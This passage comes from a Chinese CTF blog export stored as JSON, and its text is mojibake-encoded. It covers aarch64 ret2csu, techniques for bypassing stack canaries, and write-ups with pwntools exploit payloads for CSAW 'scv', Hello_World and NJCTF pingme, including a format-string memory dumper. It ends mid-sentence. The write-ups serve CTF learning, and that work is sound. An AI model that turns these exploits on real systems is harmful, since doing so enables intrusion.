PC,LRã€‚å°†LRä¸­ä¿å­˜çš„åœ°å€ç»™PCæ¥æ‰§è¡Œã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438918.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438088.png)\n\nä¹ŸåŒæ ·é€šè¿‡æ ˆåŠ«æŒæ¥æ§åˆ¶ã€‚\n\n2.éå¶å­å‡½æ•°ï¼šä¹Ÿå·®ä¸å¤šï¼Œä½†æœ‰äº›ä¸åŒçš„æ˜¯ï¼Œè¿›å…¥å‡½æ•°åï¼Œä¼šå…ˆå¼€è¾Ÿæ ˆç©ºé—´ï¼Œå…ˆå‹å…¥LRç„¶åå‹å…¥FPã€‚stp  x29, x30, [sp, #-0x30]!å³éå¶å­å‡½æ•°æ ˆä¸­çš„FPå’ŒLRéƒ½ä¿å­˜åœ¨æ ˆé¡¶ï¼Œæœ€åé€šè¿‡LDP X29, X30, [SP+0x30+var_30]åŠ ä¸ŠRETæ¥è¿”å›ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438694.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439144.png)\n\nå¯ä»¥çœ‹åˆ°è¿›å…¥éå¶å­å‡½æ•°ä¸­ä¹‹åï¼Œå…ˆå¼€è¾Ÿæ ˆç©ºé—´ï¼Œç„¶åå‹å…¥LRï¼Œå†å‹å…¥FPï¼Œæ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n| Last FP     | <- SP\n+-------------+\n| LR          |\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|Last Last FP | <- frame pointer\n+-------------+\n|Last LR      | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\npaddintä»¥ä¸‹çš„éƒ¨åˆ†æ‰æ˜¯æˆ‘ä»¬è¦åŠ«æŒçš„ã€‚\n\næ‰€ä»¥æˆ‘ä»¬åœ¨è¯¥å‡½æ•°ä¸­çš„æ ˆæº¢å‡ºåŠ«æŒçš„å…¶å®ä¸æ˜¯è¯¥å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè€Œæ˜¯ä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›ï¼Œæ‰€ä»¥è¿™é‡ŒåŒæ—¶ä¹Ÿéœ€è¦ç¡®ä¿ä¸Šä¸€ä¸ªå‡½æ•°ä¸­æ±‡ç¼–ä»£ç å‰©ä¸‹çš„æ“ä½œä¸ä¼šå¯¹æˆ‘ä»¬è¦†ç›–çš„æ ˆä¸Šçš„å€¼è¿›è¡Œé‡è¦æ”¹å†™ï¼Œä¸ç„¶æ ˆä¸Šçš„æ•°æ®å°±å®¹æ˜“è¢«ç ´åã€‚\n\nå…¶æ¬¡éœ€è¦æ³¨æ„çš„æ˜¯aarch64ä¸‹çš„gadgetæœç´¢ï¼Œç”¨åˆ°ï¼š\n\nROPgadget --binary ./pwn --only \"ldp|ret\"\n\nå…¶å®æ˜¯ä¸€æ ·çš„ï¼Œldpå°±ç±»ä¼¼popï¼Œåæ­£gadgetè¿ç”¨ç®—æ˜¯æ›´åŠ çµæ´»äº†ã€‚\n\nâ–²é€šå¸¸ä¹Ÿå¯ä»¥ç”¨ret2csuæ¥æå®šï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n.text:00000000004008AC             LDR             X3, [X21,X19,LSL#3]     â‘¡\n.text:00000000004008B0             MOV             X2, X22\n.text:00000000004008B4             MOV             X1, X23\n.text:00000000004008B8             MOV             W0, W24\n.text:00000000004008BC             ADD             X19, X19, #1\n.text:00000000004008C0             BLR             X3                      â‘¢\n.text:00000000004008C4             CMP             X19, X20\n.text:00000000004008C8             B.NE            loc_4008AC\n.text:00000000004008CC\n.text:00000000004008CC loc_4008CC   \n.text:00000000004008CC             LDP             X19, X20, [SP,#var_s10] â‘ \n.text:00000000004008D0             LDP             X21, X22, [SP,#var_s20]\n.text:00000000004008D4             LDP             X23, X24, [SP,#var_s30]\n.text:00000000004008D8             LDP             X29, X30, [SP+var_s0],#0x40\n.text:00000000004008DC             RET\n```\n\nâ–²ä¾‹å¦‚è¯¥SPå³ä¸º0x40007ffe40ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439928.png)\n\nä¸€ç›´åˆ°0x40007ffe90ä¸ºFPï¼Œé‚£ä¹ˆå¦‚ä¸‹\n\n```\n#æ³¨é‡Šå¤´\n\n0x616161â€¦         <-FP\n0x4008cc          <-LR\n```\n\nè·³è½¬0x4008CC(u_gadget1)ä¹‹åï¼ŒSPä¸º0x40007ffea0ä¾æ¬¡èµ‹å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439548.png)\n\nå†é€šè¿‡LDP  X29, X30, [SP+var_s0],#0x40å’Œretè·³è½¬åˆ°0x4008ac(u_gadget2)æœ€ç»ˆå®ç°X0~X3èµ‹å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439293.png)\n\næœ€ç»ˆè·³è½¬å‡½æ•°çœŸå®åœ°å€0x400090f9c8ï¼Œå³éœ€è¦ç»™X21èµ‹å€¼ä¸ºread_got_addrï¼Œå‚æ•°ä¾æ¬¡ä¸ºread(0,0x411010,0x8)ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨readå®Œæˆä¹‹åï¼Œè¿˜æ˜¯ä¼šå›åˆ°å½“å‰çš„ä¸‡èƒ½gadgetå¤„0x4008C4ï¼Œå†æ¥ç€è¿è¡Œä¸‹å»ã€‚ç„¶åä¸€è·¯è¿è¡Œä¸‹å»ï¼Œç»è¿‡ä¸‡èƒ½gadgetä¸­çš„RETè¿”å›åˆ°ä¹‹å‰è®¾ç½®çš„0x40007ffee8å¤„ä¹Ÿå°±æ˜¯0x400824ï¼Œè¿™ä¸ªä¹Ÿæ˜¯åœ¨æœ€å¼€å§‹å°±è®¾ç½®å¥½çš„ï¼Œé€šå¸¸å¯ä»¥ç”¨æ¥è¿”å›åˆ°readå‡½æ•°æˆ–è€…mainå‡½æ•°å¤„å†æ‰§è¡Œæ ˆæº¢å‡ºï¼Œä¹‹åå°±æ­£å¸¸æ“æ§ç¨‹åºã€‚\n\nâ–²è„šæœ¬ç¤ºä¾‹ï¼š\n\n```python\ndef aarch64_csu(call, x0, x1, x2,ret_addr):\n    payload = p64(u_gadget1)\n    payload += \"A\"*0x8\n    payload += p64(u_gadget2)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(call)          #got_addr\n    payload += p64(x2)\n    payload += p64(x1)\n    payload += p64(x0)\n    payload += \"B\"*0x8\n    payload += p64(ret_addr)\n    return payload\n\npayload = flat(cyclic(72)\npayload += aarch64_csu(elf.got['read'], 0, bss_addr, 8,ret_addr))\n```\n\nè¿™ä¸ªæ˜¯æ²¡æœ‰æ ˆåŠ«æŒçš„ã€‚Aarch64çš„csuä¹Ÿä¸æ€ä¹ˆç”¨åˆ°ï¼Œå› ä¸ºaarch64çš„csuèµ‹å€¼ä¸æ˜¯popï¼ŒSPåŸºæœ¬ä¸ä¼šåŠ¨ï¼Œè€Œä¸”å¤§å¤šæ—¶å€™éƒ½æ˜¯SPå¯»å€ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.anquanke.com/post/id/199112#h3-23\n","tags":["ARM-Knowledge"],"categories":["ARM"]},{"title":"Canaryç»•è¿‡æ€»ç»“","url":"/2021/08/19/Canaryç»•è¿‡æ€»ç»“/","content":"\n1.æœ‰å¾ªç¯æ—¶ï¼Œ32æˆ–è€…64ä½ç¨‹åºä¸‹éƒ½å¯ä»¥é€å­—èŠ‚çˆ†ç ´ç»•è¿‡ã€‚\n\n2.å¯é€šè¿‡printfå­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²(%p.%p.%p....)ã€‚\n\n3.é€šè¿‡æ‰“å°æ ˆä¸Šæ•°æ®çš„æ‰“å°å‡½æ•°æ ˆæº¢å‡ºè¿ä¸Šcanaryæ³„éœ²å‡ºæ¥ã€‚\n\n4.å½“ç¨‹åºç›´æ¥è¯»å–flagè¿›å…¥å†…å­˜æ—¶ï¼Œåˆ©ç”¨å‡½æ•°__stack_chk_failï¼ŒåŠ ä¸Šè¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºè¦†ç›–argv[0]ä¸ºç¨‹åºä¸­ä¿å­˜flagçš„åœ°å€ã€‚è¿™æ ·å½“__stack_chk_failè¿è¡Œæ—¶å°±ä¼šæ‰“å°å‡ºargv[0]ä¸­åœ°å€ä¸Šå¯¹åº”çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagã€‚æœ‰æ—¶å€™éœ€è¦è®¾ç½®è¿œç¨‹ç¯å¢ƒå˜é‡LIBC_FATAL_STDERR_=1ï¼Œå°†flagæ‰“å°åœ¨æœ¬åœ°ã€‚\n\n5.ç”±pthreadå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°ä¸­å¦‚æœæœ‰è¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºï¼Œå¯ä»¥ç›´æ¥è¦†ç›–canaryæ¥æºtcbhead_tç»“æ„ä½“ä¸­çš„canaryå’Œæ ˆä¸­çš„canaryä¸ºåŒä¸€æ•°å€¼ï¼Œè¿™æ ·æ£€æŸ¥ä»æ—§é€šè¿‡ã€‚\n\n(64ä½ä¸­ä¸ºfs:[28h]ï¼Œ32ä½ä¸­ä¸ºgs:[14h])\n\nâ–²æŸ¥æ‰¾æ–¹æ³•ï¼š\n\n(1)pwndbg>catch syscall 158\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520600.jpeg)\n\n(2)æŸ¥çœ‹rsiå¯„å­˜å™¨ï¼Œé‡Œé¢å­˜çš„å†…å®¹å°±æ˜¯tcbhead_tç»“æ„ä½“çš„é¦–åœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520328.jpeg)\n\n(3)ä¹‹åå°±å¯ä»¥æŸ¥çœ‹canaryçš„å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520551.jpeg)\n\nä½†æ˜¯è¿™ä¸ªæ–¹æ³•å¥½åƒä¸æ€ä¹ˆé¡¶ç”¨äº†ï¼Œlibc2.23åŠä»¥ä¸‹éƒ½è¡Œï¼Œä½†æ˜¯libc2.27å°±ä¼šå‡ºç°æ— æ³•è®¿é—®çš„é”™è¯¯ï¼Œå…·ä½“çš„åŸå› å¥½åƒæ˜¯libcå‡çº§ä¹‹åæ·»åŠ äº†ä»€ä¹ˆä¸œè¥¿è®¾ç½®äº†ä¸å¯è®¿é—®ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520546.jpeg)\n\n32ä½ä¸‹æ²¡æœ‰arch_prctlè¿™ä¸ªç³»ç»Ÿè°ƒç”¨äº†ï¼Œéœ€è¦çœ‹canaryçš„ç”Ÿæˆå‡½æ•°è°ƒç”¨äº†ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨ï¼Œæ–¹æ³•ç±»ä¼¼ï¼Œä¸‹æ–­ç‚¹ä¹‹åæŸ¥å‡ºæ¥ã€‚\n\nâ˜…IDAä¸­è¿œç¨‹è°ƒè¯•ä¹Ÿå¯ä»¥æŸ¥å‡ºæ¥ï¼Œåˆ©ç”¨ç¨‹åºå¼€å¤´çš„fs:28ï¼Œæ‰¾åˆ°åœ°å€ï¼Œç„¶åå‡å»libcåŸºåœ°å€å°±å¯ä»¥å¾—åˆ°åç§»ã€‚ä½†æ˜¯éœ€è¦libcä¸€è‡´ï¼Œåç§»æ‰ä¼šä¸€è‡´ã€‚è€Œä¸”è¿™ä¸ªåç§»å¹¶ä¸æ˜¯åœ¨libcæ•°æ®æ®µä¸Šï¼Œåªæ˜¯ç¨‹åºåˆå§‹åŒ–æ—¶æ”¾åœ¨åé¢çš„ï¼Œæ‰€ä»¥ä¸åŒçš„ç¨‹åºä¸åŒçš„libcéƒ½ä¼šå¯¼è‡´åç§»ä¸ä¸€æ ·ï¼Œéœ€è¦å…·ä½“è°ƒè¯•ã€‚\n\nâ–²é•¿åº¦ä¸€èˆ¬ä¸ºrbp+2000å·¦å³ï¼Œä¸åŒçš„Libcç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦è°ƒè¯•æ‰èƒ½çŸ¥é“ã€‚åŸå› æ˜¯é€šè¿‡pthreadå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°æ ˆä¼šè¢«å®‰ç½®åˆ°ä¸TLSç›¸å·®çº¦2000å­—èŠ‚çš„è·ç¦»å¤„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520195.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520726.png)\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªæ˜¯mainå‡½æ•°æ ˆï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨mainå‡½æ•°ä¸­é€šè¿‡pthreadè¿›ç¨‹åˆ›å»ºå¹¶ä¸”è°ƒç”¨çš„å‡½æ•°æ ˆï¼Œä¸¤è€…ç›¸å·®å°†è¿‘0x700000000è¿™ä¹ˆè¿œï¼Œå®Œå…¨ä¸æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ç›¸å·®çš„æ ˆè·ç¦»ã€‚åŒæ—¶åœ¨è¯¥å‡½æ•°ä¸­rbpæŒ‡å‘çš„å§‹ç»ˆæ˜¯0000(å…¨æ˜¯)ï¼Œè¯¥å‡½æ•°ç»“æŸåä¼šå…ˆè·³è½¬åˆ°libcä¸­çš„libpthreadæ¥æ¢å¤æ ˆã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nâ–²64ä½çš„tcbhead_tç»“æ„ä½“ï¼š\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//å³ä¸ºcanaryï¼Œfs:28hå¤„\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"CSAW Quals CTF 2017-scv","url":"/2021/08/19/CSAW Quals CTF 2017-scv/","content":"\n1.å¸¸è§„checksecï¼Œå¼€å¯äº†NXå’ŒCanaryã€‚æ‰“å¼€IDAå‘ç°ç¨‹åºä¸¤ä¸ªæ¼æ´ï¼š\n\n(1)åŠŸèƒ½1ä¸­æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [rsp+10h] [rbp-B0h]\n--------------------------------------\nv25 = read(0, &buf, 0xF8uLL);\n```\n\n(2)åŠŸèƒ½2ä¸­è¾“å‡ºå­—ç¬¦ä¸²ï¼šputs(&buf);\n\næ³¨ï¼šè¿™é‡Œçš„putå’Œprintfä¸æ˜¯åŒä¸€ä¸ªæ¦‚å¿µï¼Œä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚ä½†æ˜¯ç”±äºputæ˜¯ç›´æ¥è¾“å‡ºæˆ‘ä»¬çš„è¾“å…¥ï¼Œè€Œæˆ‘ä»¬çš„è¾“å…¥è¢«ä¿å­˜åœ¨mainå‡½æ•°æ ˆä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¾“å…¥è¶³å¤Ÿå¤šçš„æ•°æ®è¿ä¸Šcanaryï¼Œåˆ©ç”¨putä¸€å¹¶æ‰“å°å‡ºæ¥ï¼Œä»è€ŒæŠŠcanaryæ³„éœ²å‡ºæ¥ã€‚\n\n2.è°ƒè¯•ï¼ŒIDAä¸­è§‚å¯Ÿä½ç½®ï¼Œè®¡ç®—åç§»ï¼Œå¯ä»¥çŸ¥é“åç§»ä¸º0xB0-0x8=0xA8=168ä¸ªå­—ç¬¦ï¼Œ(canaryé€šå¸¸è¢«æ”¾åœ¨rbp-0x08çš„ä½ç½®å¤„ï¼Œå½“ç„¶ä¹Ÿä¸ä¸€å®šï¼Œæœ€å¥½è¿˜æ˜¯è°ƒè¯•ä¸€ä¸‹)è¿™æ ·å°±å¯ä»¥æ„é€ ç¬¬ä¸€ä¸ªpayload:payload1 = â€Aâ€*168 + â€œBâ€ã€‚\n\nè¿™é‡Œå†åŠ ä¸€ä¸ªBæ˜¯å› ä¸ºcanaryçš„ä¿æŠ¤æœºåˆ¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹canaryçš„æœ€åä¸¤ä½ä¹Ÿå°±æ˜¯æœ€åä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯\\x00ï¼Œç”±äºæ˜¯å¤§ç«¯åºï¼Œæ‰€ä»¥å¯ä»¥é˜²æ­¢ä¸å°å¿ƒæŠŠcanaryæ³„éœ²å‡ºæ¥ã€‚å› ä¸ºä¸Šä¸€ä¸ªæ ˆå†…å­˜çš„æœ€åç¬¬ä¸€ä¸ªå­—ç¬¦è¿æ¥çš„æ˜¯ä¸‹ä¸€ä¸ªæ ˆå†…å­˜çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯canaryä¸­çš„\\x00ï¼Œè€Œæ‰“å°å‡½æ•°é»˜è®¤00æ˜¯å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ‰€ä»¥è¿™é‡Œå¦‚æœè¾“å…¥â€Aâ€*168ï¼Œé‚£ä¹ˆæ‰“å°å‡ºæ¥çš„å°±åªä¼šæ˜¯168ä¸ªAï¼Œä¸ä¼šå°†canaryå¸¦å‡ºæ¥ã€‚æ‰€ä»¥æˆ‘ä»¬å†åŠ ä¸€ä¸ªBï¼Œè¦†ç›–æ‰canaryåœ¨å å†…å­˜çš„ç¬¬ä¸€ä¸ªå­—ç¬¦00ï¼Œä»è€Œèƒ½å¤Ÿè¿æ¥ä¸Šæˆä¸ºä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ã€‚ä½†åˆç”±äºæ˜¯å¤§ç«¯åºï¼Œæ³„éœ²å‡ºæ¥çš„canaryåº”è¯¥æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯Bï¼Œå¯¹åº”\\x42ï¼Œè¿™é‡Œéœ€è¦ä¿®æ”¹æˆ\\x00ä»è€Œè·å¾—æ­£ç¡®çš„canaryã€‚åŒç†ï¼Œå¦‚æœéšæœºåŒ–çš„canaryä¸­å«æœ‰\\x00ï¼Œé‚£ä¹ˆä»ç„¶ä¼šå¯¼è‡´å­—ç¬¦ä¸²æˆªæ–­ï¼Œæ— æ³•å¾—åˆ°æ­£ç¡®çš„canaryã€‚æ‰€ä»¥å…¶å®å¦‚æœå¤šæ‰§è¡Œå‡ æ¬¡ï¼Œç¢°åˆ°åŒ…å«\\x00çš„canaryï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚\n\næ³„éœ²åŠ ä¿®æ”¹ï¼šcanary = u64('\\x00'+io.recv(7))\n\n3.ä¹‹åå°±å¯ä»¥åˆ©ç”¨canaryçš„å€¼å’Œæ ˆæº¢å‡ºï¼Œè°ƒç”¨putå‡½æ•°æ‰“å°å…¶å®ƒå‡½æ•°çš„å®é™…åœ°å€ã€‚è¿™é‡Œç¨‹åºä½¿ç”¨äº†readå‡½æ•°ï¼Œå¹¶ä¸”åŒæ—¶å¤–éƒ¨è°ƒç”¨äº†readå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥readçš„.gotè¡¨çš„å€¼ï¼Œä½¿å…¶æ‰“å°readå‡½æ•°çš„çœŸå®åœ°å€ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæ˜¯64ä½ç¨‹åºï¼Œä¼ å‚æ˜¯ä»rdiå¼€å§‹ï¼Œæ‰€ä»¥æ ˆæº¢å‡ºçš„ç¬¬ä¸€ä¸ªè¿”å›åœ°å€åº”è¯¥ç»™rdièµ‹å€¼æ‰å¯¹ï¼Œç¼–å†™payload1ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload1 = \"\"\npayload1 += \"A\"*168 #padding\npayload1 += p64(canary) #åœ¨canaryåº”è¯¥åœ¨çš„ä½ç½®ä¸Šå†™canary\npayload1 += \"B\"*8 #è¿™ä¸€æ®µå®é™…ä¸Šæ˜¯rbpçš„ä½ç½®\npayload1 += p64(pop_rdi)   \n#è·³è½¬åˆ°pop rdi;retn;æ‰€åœ¨è¯­å¥(å¯ä»¥é€šè¿‡ROPgadgetæŸ¥è¯¢)ï¼Œæ¥ç»™rdiä¼ å…¥readå‡½æ•°çš„gotè¡¨ä¸­çš„åœ°å€ã€‚\npayload1 += p64(read_got) #è¢«pop rdiè¯­å¥è°ƒç”¨ï¼Œå‡ºæ ˆ\npayload1 += p64(puts_plt)\n#retnåˆ°putå‡½æ•°çš„pltè¡¨ï¼Œè°ƒç”¨putå‡½æ•°ã€‚\npayload1 += p64(start)\n#è°ƒç”¨ä¹‹åï¼Œè¿”å›ç¨‹åºæœ€å¼€å§‹ï¼Œæ¢å¤æ ˆå¸§ï¼Œå†æ‰§è¡Œä¸€éç¨‹åº\n```\n\nè¿™æ ·å°±å¯ä»¥å¾—åˆ°readçš„å®é™…åœ°å€ï¼Œä»è€Œé€šè¿‡libcåº“è®¡ç®—åç§»åœ°å€å¾—åˆ°åŸºåœ°å€ã€‚\n\n5.ç°åœ¨æœ‰äº†libcåº“çš„åŸºåœ°å€ï¼Œè§‚å¯Ÿmainå‡½æ•°é€€å‡ºæ—¶çš„æ±‡ç¼–ä»£ç ï¼šmov   eax, 0å¯ä»¥ä½¿ç”¨åœ¨2.24libcåº“æ¡ä»¶ä¸‹å¯ä»¥ä½¿ç”¨onegadgetã€‚\n\n6.ç›´æ¥è®¡ç®—onegadgetåç§»ï¼Œç„¶åè¦†ç›–mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œgetshellã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"Hello_World","url":"/2021/08/19/Hello_World/","content":"\n1.å¾ˆç®€å•çš„ä¸€ä¸ªç¨‹åºï¼ŒIDAæ‰“å¼€ï¼Œ32ä½ç¨‹åºï¼Œmainå‡½æ•°-helloå‡½æ•°ä¸­\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556311.jpeg)\n\n```\n#æ³¨é‡Šå¤´\n\nint buf; // [esp+6h] [ebp-12h]\nread(0, &buf, 0x64u);\n```\n\nbufè·ç¦»æ ˆåº•æœ‰0x12hï¼Œè€Œå¯ä»¥è¯»å…¥çš„æ•°æ®æœ‰0x64hï¼Œæ‰€ä»¥å¯ä»¥æ ˆæº¢å‡ºã€‚\n\n2.checksecä¸€ä¸‹ï¼Œå¼€äº†NXï¼Œä¸èƒ½shellcodeï¼Œè¿™é‡Œä¹Ÿä¸éœ€è¦ï¼Œå› ä¸ºæˆ‘ä»¬çš„è¾“å…¥å¹¶ä¸ä¼šè¢«å½“æˆæŒ‡ä»¤æ¥æ‰§è¡Œã€‚\n\n3.ç¨‹åºä¸­è‡ªå¸¦åé—¨getShellå‡½æ•°ï¼Œå¹¶ä¸”æœ‰æ ˆæº¢å‡ºï¼Œé‚£ä¹ˆç›´æ¥è¦†ç›–helloå‡½æ•°çš„è¿”å›åœ°å€è·³è½¬å³å¯ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556319.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556326.jpeg)\n\n4.ç¼–å†™payload:\n\npayload = \"a\"*(0x12+0x04)  #padding\n\n(å…¶ä¸­0x12æ˜¯è¦†ç›–æ‰è·ç¦»æ ˆåº•çš„å†…å®¹ï¼Œ0x04æ˜¯è¦†ç›–æ‰helloå‡½æ•°è¿”å›çš„ebpï¼Œä¹‹åæ‰æ˜¯è¦†ç›–helloå‡½æ•°çš„è¿”å›åœ°å€)\n\npayload += p32(0x0804846B)  ##è¦†ç›–è¿”å›åœ°å€\n\n5.ä¹‹åè¾“å…¥ï¼Œç„¶åInteractive()å³å¯ã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["First"],"categories":["PWN","StackOverflow0x1"]},{"title":"NJCTF2017_pingme","url":"/2021/08/19/NJCTF2017_pingme/","content":"\n1.æ­å»ºé¢˜ç›®ï¼šsocat tcp-listen:10001,fork exec:./pingme,reuseaddr &\n\n2.é¢˜ç›®ä¸ç»™æ–‡ä»¶ï¼Œåªæœ‰åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½æ˜¯BROPä¹Ÿå¯èƒ½æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ã€‚è¿æ¥ä¸Šå…ˆå°è¯•æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ï¼Œè¾“å…¥å¤šä¸ª%p.%p.%pï¼Œå¯ä»¥çœ‹åˆ°æ³„éœ²å‡ºäº†æ•°æ®ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518475.jpeg)\n\n3.é¦–å…ˆåˆ©ç”¨çˆ†ç ´æ‰¾åˆ°æˆ‘ä»¬è¾“å…¥çš„å‚æ•°åç§»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfrom pwn import*\nio = remote(\"127.0.0.1\",10001)\n#io = process(\"./pingme\")\n\ndef exec_fmt(payload):\n    io.sendline(payload)\n    info = p.recv()\n    return info\n\nauto = FmtStr(exec_fmt)\noffset = auto.offset\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518534.jpeg)\n\nåç§»ä¸º7ï¼ŒéªŒè¯ä¸€ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518484.jpeg)\n\n4.åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°†äºŒè¿›åˆ¶æ–‡ä»¶dumpä¸‹æ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfrom pwn import*\n\ndef dump_memory(start_addr,end_addr):\n    result = \"\"\n    while start_addr < end_addr:\n        io = remote('127.0.0.1',10001)\n        io.recvline()\n        payload = \"%9$s.AAA\" + p32(start_addr)\n        io.sendline(payload)\n        data = io.recvuntil(\".AAA\")[:-4]\n        if data == \"\":\n            data = \"\\x00\"\n        log.info(\"leaking: 0x%x --> %s\"%(start_addr,data.encode('hex')))\n        result += data\n        start_addr += len(data)\n        io.close()\n    return result\nstart_addr = 0x8048000\nend_addr = 0x8049000\ncode_bin = dump_memory(start_addr,end_addr)\nwith open(\"code.bin\",\"wb\") as f:\n    f.write(code_bin)\n    f.close()\n```\n\n(1)ç”±äºæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰“å°ï¼Œä¼šæ‰“å°åˆ°å­—ç¬¦ä¸²ç»“å°¾\"\\x00\"ï¼Œä½†æ˜¯ä¸ä¼šæ‰“å°å‡º\"\\x00\"ï¼Œæ‰€ä»¥éœ€è¦è¡¥ä¸Š\"\\x00\"ã€‚\n\n(2)è¿™é‡Œçš„%9$s.AAAä¸­åç§»ä¸º9ï¼Œæ˜¯å› ä¸ºæ‰“å°çš„æ˜¯p32(start_addr)å¤„çš„å†…å®¹ï¼Œå‰é¢æœ‰%9$s.AAAå…±å…«ä¸ªå­—èŠ‚ï¼Œä¸¤ä¸ªåœ°å€å•ä½ï¼Œæ‰€ä»¥åç§»7+2=9ã€‚å¹¶ä¸”å¡«å……AAAä¹Ÿæ˜¯ä¸ºäº†æ»¡è¶³åœ°å€å¯¹é½ï¼ŒåŒæ—¶ä½œä¸ºç‰¹å¾ç‚¹æ¥è·å–ç¨‹åºä¼ å›æ¥çš„æ•°æ®ã€‚å°†åœ°å€æ”¾åœ¨åé¢ä¹Ÿæ˜¯ä¸ºäº†é˜²æ­¢åœ°å€ä¸­çš„\"\\x00\"é€ 